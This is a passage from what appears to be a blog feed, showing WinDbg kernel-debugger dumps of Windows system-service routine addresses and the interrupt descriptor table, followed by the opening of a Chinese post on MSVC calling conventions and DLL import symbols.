fffff80252b621b0 - nt!NtInitiatePowerAction (fffff802&#96;52b621b0)
fffff80252b66cc0 - nt!NtIsSystemResumeAutomatic (fffff802&#96;52b66cc0)
fffff80252b5f2f0 - nt!NtIsUILanguageComitted (fffff802&#96;52b5f2f0)
fffff80252bc0d60 - nt!NtListenPort (fffff802&#96;52bc0d60)
fffff80252b6d7a0 - nt!NtLoadDriver (fffff802&#96;52b6d7a0)
fffff80252cd1180 - nt!NtLoadEnclaveData (fffff802&#96;52cd1180)
fffff80252b6ef50 - nt!NtLoadKey (fffff802&#96;52b6ef50)
fffff80252b6eef0 - nt!NtLoadKey2 (fffff802&#96;52b6eef0)
fffff80252a50870 - nt!NtLoadKeyEx (fffff802&#96;52a50870)
fffff80252a9ec90 - nt!NtLockFile (fffff802&#96;52a9ec90)
fffff80252b9f420 - nt!NtLockProductActivationKeys (fffff802&#96;52b9f420)
fffff80252bb0380 - nt!NtLockRegistryKey (fffff802&#96;52bb0380)
fffff8025264cec0 - nt!NtLockVirtualMemory (fffff802&#96;5264cec0)
fffff80252b1f0a0 - nt!NtMakePermanentObject (fffff802&#96;52b1f0a0)
fffff80252b0a7e0 - nt!NtMakeTemporaryObject (fffff802&#96;52b0a7e0)
fffff80252ccba70 - nt!NtManageHotPatch (fffff802&#96;52ccba70)
fffff80252a1c460 - nt!NtManagePartition (fffff802&#96;52a1c460)
fffff80252d56810 - nt!NtMapCMFModule (fffff802&#96;52d56810)
fffff80252cd3a10 - nt!NtMapUserPhysicalPages (fffff802&#96;52cd3a10)
fffff80252b0a730 - nt!NtMapViewOfSectionEx (fffff802&#96;52b0a730)
fffff80252d50e80 - nt!NtModifyBootEntry (fffff802&#96;52d50e80)
fffff80252d50eb0 - nt!NtModifyDriverEntry (fffff802&#96;52d50eb0)
fffff80252afc740 - nt!NtNotifyChangeDirectoryFile (fffff802&#96;52afc740)
fffff80252afc7a0 - nt!NtNotifyChangeDirectoryFileEx (fffff802&#96;52afc7a0)
fffff802529e2150 - nt!NtNotifyChangeKey (fffff802&#96;529e2150)
fffff802529e2200 - nt!NtNotifyChangeMultipleKeys (fffff802&#96;529e2200)
fffff80252ae4140 - nt!NtNotifyChangeSession (fffff802&#96;52ae4140)
fffff802527cd0e0 - nt!NtOpenEnlistment (fffff802&#96;527cd0e0)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252c91700 - nt!NtOpenIoCompletion (fffff802&#96;52c91700)
fffff802529cfac0 - nt!NtOpenJobObject (fffff802&#96;529cfac0)
fffff80252a93720 - nt!NtOpenKeyEx (fffff802&#96;52a93720)
fffff80252c65280 - nt!NtOpenKeyTransacted (fffff802&#96;52c65280)
fffff80252a52f40 - nt!NtOpenKeyTransactedEx (fffff802&#96;52a52f40)
fffff80252d57e30 - nt!NtOpenKeyedEvent (fffff802&#96;52d57e30)
fffff80252af0cc0 - nt!NtOpenMutant (fffff802&#96;52af0cc0)
fffff80252af8be0 - nt!NtOpenObjectAuditAlarm (fffff802&#96;52af8be0)
fffff80252bbe550 - nt!NtOpenPartition (fffff802&#96;52bbe550)
fffff80252af34b0 - nt!NtOpenPrivateNamespace (fffff802&#96;52af34b0)
fffff80252a66a70 - nt!NtOpenProcessToken (fffff802&#96;52a66a70)
fffff80252c652a0 - nt!NtOpenRegistryTransaction (fffff802&#96;52c652a0)
fffff802527cd100 - nt!NtOpenResourceManager (fffff802&#96;527cd100)
fffff80252af1e80 - nt!NtOpenSemaphore (fffff802&#96;52af1e80)
fffff80252b0d830 - nt!NtOpenSession (fffff802&#96;52b0d830)
fffff80252ad7f10 - nt!NtOpenSymbolicLinkObject (fffff802&#96;52ad7f10)
fffff80252a661c0 - nt!NtOpenThread (fffff802&#96;52a661c0)
fffff80252d4bf00 - nt!NtOpenTimer (fffff802&#96;52d4bf00)
fffff802527cd120 - nt!NtOpenTransaction (fffff802&#96;527cd120)
fffff802527cd140 - nt!NtOpenTransactionManager (fffff802&#96;527cd140)
fffff802529d8ef0 - nt!NtPlugPlayControl (fffff802&#96;529d8ef0)
fffff802527cd160 - nt!NtPrePrepareComplete (fffff802&#96;527cd160)
fffff802527cd180 - nt!NtPrePrepareEnlistment (fffff802&#96;527cd180)
fffff802527cd1a0 - nt!NtPrepareComplete (fffff802&#96;527cd1a0)
fffff802527cd1c0 - nt!NtPrepareEnlistment (fffff802&#96;527cd1c0)
fffff80252a17f00 - nt!NtPrivilegeCheck (fffff802&#96;52a17f00)
fffff80252b78df0 - nt!NtPrivilegeObjectAuditAlarm (fffff802&#96;52b78df0)
fffff80252b057c0 - nt!NtPrivilegedServiceAuditAlarm (fffff802&#96;52b057c0)
fffff802527cd1e0 - nt!NtPropagationComplete (fffff802&#96;527cd1e0)
fffff802527cd200 - nt!NtPropagationFailed (fffff802&#96;527cd200)
fffff80252d58c30 - nt!NtPssCaptureVaSpaceBulk (fffff802&#96;52d58c30)
fffff80252aae8e0 - nt!NtPulseEvent (fffff802&#96;52aae8e0)
fffff80252d57a50 - nt!NtQueryAuxiliaryCounterFrequency (fffff802&#96;52d57a50)
fffff80252d50ee0 - nt!NtQueryBootEntryOrder (fffff802&#96;52d50ee0)
fffff80252d51160 - nt!NtQueryBootOptions (fffff802&#96;52d51160)
fffff80252761440 - nt!NtQueryDebugFilterState (fffff802&#96;52761440)
fffff80252a8c710 - nt!NtQueryDirectoryFileEx (fffff802&#96;52a8c710)
fffff80252a8aa10 - nt!NtQueryDirectoryObject (fffff802&#96;52a8aa10)
fffff80252d51460 - nt!NtQueryDriverEntryOrder (fffff802&#96;52d51460)
fffff80252ae9f70 - nt!NtQueryEaFile (fffff802&#96;52ae9f70)
fffff80252a161c0 - nt!NtQueryFullAttributesFile (fffff802&#96;52a161c0)
fffff80252aef9e0 - nt!NtQueryInformationAtom (fffff802&#96;52aef9e0)
fffff80252c91aa0 - nt!NtQueryInformationByName (fffff802&#96;52c91aa0)
fffff802527cd220 - nt!NtQueryInformationEnlistment (fffff802&#96;527cd220)
fffff80252a98850 - nt!NtQueryInformationJobObject (fffff802&#96;52a98850)
fffff80252cbedd0 - nt!NtQueryInformationPort (fffff802&#96;52cbedd0)
fffff802527cd240 - nt!NtQueryInformationResourceManager (fffff802&#96;527cd240)
fffff802527cd260 - nt!NtQueryInformationTransaction (fffff802&#96;527cd260)
fffff802527cd280 - nt!NtQueryInformationTransactionManager (fffff802&#96;527cd280)
fffff802529b43b0 - nt!NtQueryInformationWorkerFactory (fffff802&#96;529b43b0)
fffff80252b01a70 - nt!NtQueryInstallUILanguage (fffff802&#96;52b01a70)
fffff80252b21860 - nt!NtQueryIntervalProfile (fffff802&#96;52b21860)
fffff80252c91820 - nt!NtQueryIoCompletion (fffff802&#96;52c91820)
fffff80252a57dc0 - nt!NtQueryLicenseValue (fffff802&#96;52a57dc0)
fffff80252a54790 - nt!NtQueryMultipleValueKey (fffff802&#96;52a54790)
fffff80252d53c40 - nt!NtQueryMutant (fffff802&#96;52d53c40)
fffff80252c653f0 - nt!NtQueryOpenSubKeys (fffff802&#96;52c653f0)
fffff80252c65610 - nt!NtQueryOpenSubKeysEx (fffff802&#96;52c65610)
fffff80252b13480 - nt!CmpCleanUpHigherLayerKcbCachesPreCallback (fffff802&#96;52b13480)
fffff80252c92c50 - nt!NtQueryQuotaInformationFile (fffff802&#96;52c92c50)
fffff80252a814e0 - nt!NtQuerySecurityAttributesToken (fffff802&#96;52a814e0)
fffff80252adb2d0 - nt!NtQuerySecurityObject (fffff802&#96;52adb2d0)
fffff80252d18a60 - nt!NtQuerySecurityPolicy (fffff802&#96;52d18a60)
fffff80252d53800 - nt!NtQuerySemaphore (fffff802&#96;52d53800)
fffff80252ad8060 - nt!NtQuerySymbolicLinkObject (fffff802&#96;52ad8060)
fffff80252d51790 - nt!NtQuerySystemEnvironmentValue (fffff802&#96;52d51790)
fffff80252b0d9d0 - nt!NtQuerySystemEnvironmentValueEx (fffff802&#96;52b0d9d0)
fffff80252ae9b60 - nt!NtQuerySystemInformationEx (fffff802&#96;52ae9b60)
fffff80252b0bf00 - nt!NtQueryTimerResolution (fffff802&#96;52b0bf00)
fffff80252a22ab0 - nt!NtQueryWnfStateData (fffff802&#96;52a22ab0)
fffff80252af6230 - nt!NtQueryWnfStateNameInformation (fffff802&#96;52af6230)
fffff80252ab36d0 - nt!NtQueueApcThreadEx (fffff802&#96;52ab36d0)
fffff802527f7bc0 - nt!NtRaiseException (fffff802&#96;527f7bc0)
fffff80252d534b0 - nt!NtRaiseHardError (fffff802&#96;52d534b0)
fffff802527cd2a0 - nt!NtReadOnlyEnlistment (fffff802&#96;527cd2a0)
fffff802527cd2c0 - nt!NtRecoverEnlistment (fffff802&#96;527cd2c0)
fffff802527cd2e0 - nt!NtRecoverResourceManager (fffff802&#96;527cd2e0)
fffff802527cd300 - nt!NtRecoverTransactionManager (fffff802&#96;527cd300)
fffff802527cd820 - nt!NtRegisterProtocolAddressInformation (fffff802&#96;527cd820)
fffff80252b0ba10 - nt!NtRegisterThreadTerminatePort (fffff802&#96;52b0ba10)
fffff80252d57f30 - nt!NtReleaseKeyedEvent (fffff802&#96;52d57f30)
fffff802526823b0 - nt!NtReleaseWorkerFactoryWorker (fffff802&#96;526823b0)
fffff802529f76f0 - nt!NtRemoveIoCompletionEx (fffff802&#96;529f76f0)
fffff80252c833c0 - nt!NtRemoveProcessDebug (fffff802&#96;52c833c0)
fffff80252c65950 - nt!NtRenameKey (fffff802&#96;52c65950)
fffff802527cd840 - nt!NtRenameTransactionManager (fffff802&#96;527cd840)
fffff80252c65e50 - nt!NtReplaceKey (fffff802&#96;52c65e50)
fffff802529c4c70 - nt!NtReplacePartitionUnit (fffff802&#96;529c4c70)
fffff80252cbef00 - nt!NtReplyWaitReplyPort (fffff802&#96;52cbef00)
fffff80252b00200 - nt!NtRequestPort (fffff802&#96;52b00200)
fffff80252abcd30 - nt!NtResetEvent (fffff802&#96;52abcd30)
fffff802529f85f0 - nt!NtResetWriteWatch (fffff802&#96;529f85f0)
fffff80252c661e0 - nt!NtRestoreKey (fffff802&#96;52c661e0)
fffff80252d09680 - nt!NtResumeProcess (fffff802&#96;52d09680)
fffff8025297cb30 - nt!NtRevertContainerImpersonation (fffff802&#96;5297cb30)
fffff802527cd320 - nt!NtRollbackComplete (fffff802&#96;527cd320)
fffff802527cd340 - nt!NtRollbackEnlistment (fffff802&#96;527cd340)
fffff80252b20d80 - nt!NtRollbackRegistryTransaction (fffff802&#96;52b20d80)
fffff802527cd360 - nt!NtRollbackTransaction (fffff802&#96;527cd360)
fffff802527cd8a0 - nt!NtRollforwardTransactionManager (fffff802&#96;527cd8a0)
fffff80252c66490 - nt!NtSaveKey (fffff802&#96;52c66490)
fffff80252b16790 - nt!NtSaveKeyEx (fffff802&#96;52b16790)
fffff80252c664b0 - nt!NtSaveMergedKeys (fffff802&#96;52c664b0)
fffff80252a2dcc0 - nt!NtSecureConnectPort (fffff802&#96;52a2dcc0)
fffff80252bbf3e0 - nt!NtSerializeBoot (fffff802&#96;52bbf3e0)
fffff80252d51ab0 - nt!NtSetBootEntryOrder (fffff802&#96;52d51ab0)
fffff80252d51cc0 - nt!NtSetBootOptions (fffff802&#96;52d51cc0)
fffff80252b18380 - nt!NtSetCachedSigningLevel (fffff802&#96;52b18380)
fffff80252b183b0 - nt!NtSetCachedSigningLevel2 (fffff802&#96;52b183b0)
fffff80252d082d0 - nt!NtSetContextThread (fffff802&#96;52d082d0)
fffff80252b8e010 - nt!NtSetDebugFilterState (fffff802&#96;52b8e010)
fffff80252bbee70 - nt!NtSetDefaultHardErrorPort (fffff802&#96;52bbee70)
fffff80252b79220 - nt!NtSetDefaultLocale (fffff802&#96;52b79220)
fffff80252b79200 - nt!NtSetDefaultUILanguage (fffff802&#96;52b79200)
fffff80252d51ed0 - nt!NtSetDriverEntryOrder (fffff802&#96;52d51ed0)
fffff80252b1e380 - nt!NtSetEaFile (fffff802&#96;52b1e380)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff8025275fc50 - nt!NtSetIRTimer (fffff802&#96;5275fc50)
fffff80252c83530 - nt!NtSetInformationDebugObject (fffff802&#96;52c83530)
fffff802527cd380 - nt!NtSetInformationEnlistment (fffff802&#96;527cd380)
fffff80252a1a940 - nt!NtSetInformationJobObject (fffff802&#96;52a1a940)
fffff80252a71fc0 - nt!NtSetInformationKey (fffff802&#96;52a71fc0)
fffff802527cd3a0 - nt!NtSetInformationResourceManager (fffff802&#96;527cd3a0)
fffff80252cd9960 - nt!NtSetInformationSymbolicLink (fffff802&#96;52cd9960)
fffff80252ab9460 - nt!NtSetInformationToken (fffff802&#96;52ab9460)
fffff802527cd3c0 - nt!NtSetInformationTransaction (fffff802&#96;527cd3c0)
fffff802527cd860 - nt!NtSetInformationTransactionManager (fffff802&#96;527cd860)
fffff80252a06330 - nt!NtSetInformationVirtualMemory (fffff802&#96;52a06330)
fffff80252666350 - nt!NtSetInformationWorkerFactory (fffff802&#96;52666350)
fffff80252b21b20 - nt!NtSetIntervalProfile (fffff802&#96;52b21b20)
fffff80252ae4590 - nt!NtSetIoCompletion (fffff802&#96;52ae4590)
fffff80252a72920 - nt!NtSetIoCompletionEx (fffff802&#96;52a72920)
fffff802527ccce0 - nt!BvgaSetVirtualFrameBuffer (fffff802&#96;527ccce0)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252c93360 - nt!NtSetQuotaInformationFile (fffff802&#96;52c93360)
fffff80252a26780 - nt!NtSetSecurityObject (fffff802&#96;52a26780)
fffff80252d520e0 - nt!NtSetSystemEnvironmentValue (fffff802&#96;52d520e0)
fffff80252d52400 - nt!NtSetSystemEnvironmentValueEx (fffff802&#96;52d52400)
fffff80252aa9c30 - nt!NtSetSystemInformation (fffff802&#96;52aa9c30)
fffff80252d956b0 - nt!NtSetSystemPowerState (fffff802&#96;52d956b0)
fffff80252d48ab0 - nt!NtSetSystemTime (fffff802&#96;52d48ab0)
fffff80252a4e8c0 - nt!NtSetThreadExecutionState (fffff802&#96;52a4e8c0)
fffff8025267ed40 - nt!NtSetTimer2 (fffff802&#96;5267ed40)
fffff80252611310 - nt!NtSetTimerEx (fffff802&#96;52611310)
fffff80252aa8f90 - nt!NtSetTimerResolution (fffff802&#96;52aa8f90)
fffff80252bb3ee0 - nt!NtSetUuidSeed (fffff802&#96;52bb3ee0)
fffff80252b5a260 - nt!NtSetVolumeInformationFile (fffff802&#96;52b5a260)
fffff80252af7bc0 - nt!NtSetWnfProcessNotificationEvent (fffff802&#96;52af7bc0)
fffff802529ad4b0 - nt!NtShutdownSystem (fffff802&#96;529ad4b0)
fffff802527582e0 - nt!NtShutdownWorkerFactory (fffff802&#96;527582e0)
fffff8025295f620 - nt!NtSignalAndWaitForSingleObject (fffff802&#96;5295f620)
fffff802527cd880 - nt!NtSinglePhaseReject (fffff802&#96;527cd880)
fffff80252d57ac0 - nt!NtStartProfile (fffff802&#96;52d57ac0)
fffff80252d57d30 - nt!NtStopProfile (fffff802&#96;52d57d30)
fffff80252a22650 - nt!NtSubscribeWnfStateChange (fffff802&#96;52a22650)
fffff80252d09700 - nt!NtSuspendProcess (fffff802&#96;52d09700)
fffff80252b093a0 - nt!NtSuspendThread (fffff802&#96;52b093a0)
fffff80252bbc780 - nt!NtSystemDebugControl (fffff802&#96;52bbc780)
fffff80252cd1800 - nt!NtTerminateEnclave (fffff802&#96;52cd1800)
fffff80252a55dc0 - nt!NtTerminateJobObject (fffff802&#96;52a55dc0)
fffff80252af9a40 - nt!NtTestAlert (fffff802&#96;52af9a40)
fffff80252c666f0 - nt!NtThawRegistry (fffff802&#96;52c666f0)
fffff802527cd3e0 - nt!NtThawTransactions (fffff802&#96;527cd3e0)
fffff80252a8d1c0 - nt!NtTraceControl (fffff802&#96;52a8d1c0)
fffff80252d526b0 - nt!NtTranslateFilePath (fffff802&#96;52d526b0)
fffff80252cbabd0 - nt!NtUmsThreadYield (fffff802&#96;52cbabd0)
fffff80252c984e0 - nt!NtUnloadDriver (fffff802&#96;52c984e0)
fffff80252a4f480 - nt!NtUnloadKey (fffff802&#96;52a4f480)
fffff80252b60b20 - nt!NtUnloadKey2 (fffff802&#96;52b60b20)
fffff80252a4f7e0 - nt!NtUnloadKeyEx (fffff802&#96;52a4f7e0)
fffff80252adea50 - nt!NtUnlockFile (fffff802&#96;52adea50)
fffff80252656660 - nt!NtUnlockVirtualMemory (fffff802&#96;52656660)
fffff80252a00720 - nt!NtUnmapViewOfSectionEx (fffff802&#96;52a00720)
fffff80252a20290 - nt!NtUnsubscribeWnfStateChange (fffff802&#96;52a20290)
fffff80252a221d0 - nt!NtUpdateWnfStateData (fffff802&#96;52a221d0)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252adf1e0 - nt!NtWaitForAlertByThreadId (fffff802&#96;52adf1e0)
fffff80252c836c0 - nt!NtWaitForDebugEvent (fffff802&#96;52c836c0)
fffff80252d582f0 - nt!NtWaitForKeyedEvent (fffff802&#96;52d582f0)
fffff8025260ff10 - nt!NtWaitForWorkViaWorkerFactory (fffff802&#96;5260ff10)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff802529c73b0 - nt!NtLoadKey3 (fffff802&#96;529c73b0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="IDT-interrupt-descriptor-table"><a href="#IDT-interrupt-descriptor-table" class="headerlink" title="IDT (interrupt descriptor table)"></a>IDT (interrupt descriptor table)</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lkd&gt; !idt

Dumping IDT: fffff8025075f000

00:	fffff80252e12100 nt!KiDivideErrorFaultShadow
01:	fffff80252e12180 nt!KiDebugTrapOrFaultShadow	Stack &#x3D; 0xFFFFF802507639D0
02:	fffff80252e12240 nt!KiNmiInterruptShadow	Stack &#x3D; 0xFFFFF802507637D0
03:	fffff80252e122c0 nt!KiBreakpointTrapShadow
04:	fffff80252e12340 nt!KiOverflowTrapShadow
05:	fffff80252e123c0 nt!KiBoundFaultShadow
06:	fffff80252e12440 nt!KiInvalidOpcodeFaultShadow
07:	fffff80252e124c0 nt!KiNpxNotAvailableFaultShadow
08:	fffff80252e12540 nt!KiDoubleFaultAbortShadow	Stack &#x3D; 0xFFFFF802507633D0
09:	fffff80252e125c0 nt!KiNpxSegmentOverrunAbortShadow
0a:	fffff80252e12640 nt!KiInvalidTssFaultShadow
0b:	fffff80252e126c0 nt!KiSegmentNotPresentFaultShadow
0c:	fffff80252e12740 nt!KiStackFaultShadow
0d:	fffff80252e127c0 nt!KiGeneralProtectionFaultShadow
0e:	fffff80252e12840 nt!KiPageFaultShadow
10:	fffff80252e128c0 nt!KiFloatingErrorFaultShadow
11:	fffff80252e12940 nt!KiAlignmentFaultShadow
12:	fffff80252e129c0 nt!KiMcheckAbortShadow	Stack &#x3D; 0xFFFFF802507635D0
13:	fffff80252e12ac0 nt!KiXmmExceptionShadow
14:	fffff80252e12b40 nt!KiVirtualizationExceptionShadow
15:	fffff80252e12bc0 nt!KiControlProtectionFaultShadow
1f:	fffff80252e12c40 nt!KiApcInterruptShadow
20:	fffff80252e12cc0 nt!KiSwInterruptShadow
29:	fffff80252e12d40 nt!KiRaiseSecurityCheckFailureShadow
2c:	fffff80252e12dc0 nt!KiRaiseAssertionShadow
2d:	fffff80252e12e40 nt!KiDebugServiceTrapShadow
2e:	fffff80252e12ec0 nt!KiSystemServiceShadow
2f:	fffff80252e12f40 nt!KiDpcInterruptShadow
30:	fffff80252e12fc0 nt!KiHvInterruptShadow
31:	fffff80252e13040 nt!KiVmbusInterrupt0Shadow
32:	fffff80252e130c0 nt!KiVmbusInterrupt1Shadow
33:	fffff80252e13140 nt!KiVmbusInterrupt2Shadow
34:	fffff80252e131c0 nt!KiVmbusInterrupt3Shadow
35:	fffff80252e13468 nt!HalpInterruptCmciService (KINTERRUPT fffff802530f2ec0)

36:	fffff80252e13470 nt!HalpInterruptCmciService (KINTERRUPT fffff802530f3100)

50:	fffff80252e13540 0xfffff80256624d20 (KINTERRUPT ffff81814970dc80)

51:	fffff80252e13548 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d3c0)

52:	fffff80252e13550 0xfffff802577c7960 (KINTERRUPT ffff818148521a00)

53:	fffff80252e13558 0xfffff802561d3c30 (KINTERRUPT ffff818148521c80)

60:	fffff80252e135c0 0xfffff8026cce6790 (KINTERRUPT ffff81814970d000)

61:	fffff80252e135c8 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d500)

62:	fffff80252e135d0 0xfffff802577c7960 (KINTERRUPT ffff8181485218c0)

63:	fffff80252e135d8 0xfffff802561d3c30 (KINTERRUPT ffff818148521780)

71:	fffff80252e13648 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d640)

72:	fffff80252e13650 0xfffff80263a0d850 (KINTERRUPT ffff818148521280)

81:	fffff80252e136c8 0xfffff80256623bb0 (KINTERRUPT ffff81814970d780)

82:	fffff80252e136d0 0xfffff802561d3c30 (KINTERRUPT ffff818148521dc0)

83:	fffff80252e136d8 0xfffff80263a0d850 (KINTERRUPT ffff818148521140)

91:	fffff80252e13748 0xfffff80256624d20 (KINTERRUPT ffff81814970d8c0)

93:	fffff80252e13758 0xfffff802561d3c30 (KINTERRUPT ffff818148521500)

	                 0xfffff802561d3c30 (KINTERRUPT ffff818148521000)

a0:	fffff80252e137c0 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7dc0)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7c80)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7b40)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7a00)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f78c0)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7780)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7640)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7500)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f73c0)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7280)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7140)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7000)

a1:	fffff80252e137c8 0xfffff80256624d20 (KINTERRUPT ffff81814970da00)

a2:	fffff80252e137d0 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d140)

a3:	fffff80252e137d8 0xfffff802561d3c30 (KINTERRUPT ffff818148521640)

b0:	fffff80252e13840 0xfffff802564f5c40 (KINTERRUPT ffff81814970ddc0)

b1:	fffff80252e13848 0xfffff80256624d20 (KINTERRUPT ffff81814970db40)

b2:	fffff80252e13850 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d280)

b3:	fffff80252e13858 0xfffff802561d3c30 (KINTERRUPT ffff818148521b40)

cd:	fffff80252e13928 nt!HalpInterruptThermalService (KINTERRUPT ffff91870a51a500)

d1:	fffff80252e13948 nt!HalpTimerClockInterrupt (KINTERRUPT fffff802530f38e0)

d2:	fffff80252e13950 nt!HalpTimerClockIpiRoutine (KINTERRUPT fffff802530f37c0)

d7:	fffff80252e13978 nt!HalpInterruptRebootService (KINTERRUPT fffff802530f3580)

d8:	fffff80252e13980 nt!HalpInterruptStubService (KINTERRUPT fffff802530f3340)

df:	fffff80252e139b8 nt!HalpInterruptSpuriousService (KINTERRUPT fffff802530f3220)

e1:	fffff80252e13240 nt!KiIpiInterruptShadow
e2:	fffff80252e139d0 nt!HalpInterruptLocalErrorService (KINTERRUPT fffff802530f3460)

e3:	fffff80252e139d8 nt!HalpInterruptDeferredRecoveryService (KINTERRUPT fffff802530f2fe0)

fe:	fffff80252e13ab0 nt!HalpPerfInterrupt (KINTERRUPT fffff802530f36a0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>留坑</tag>
        <tag>Hacking</tag>
        <tag>DLL hook</tag>
      </tags>
  </entry>
  <entry>
    <title>CALL_CONVENTION</title>
    <url>/2021/04/15/call_convention/</url>
    <content><![CDATA[<h1 id="CALL-CONVENTION"><a href="#CALL-CONVENTION" class="headerlink" title="CALL_CONVENTION"></a>CALL_CONVENTION</h1><h2 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h2><p>为了让两个不同调用约定的能够互相调用，由于不同调用约定对于符号的不同修饰，我选择使用 dll 手动修改导入符号，防止符号错乱的问题。</p>
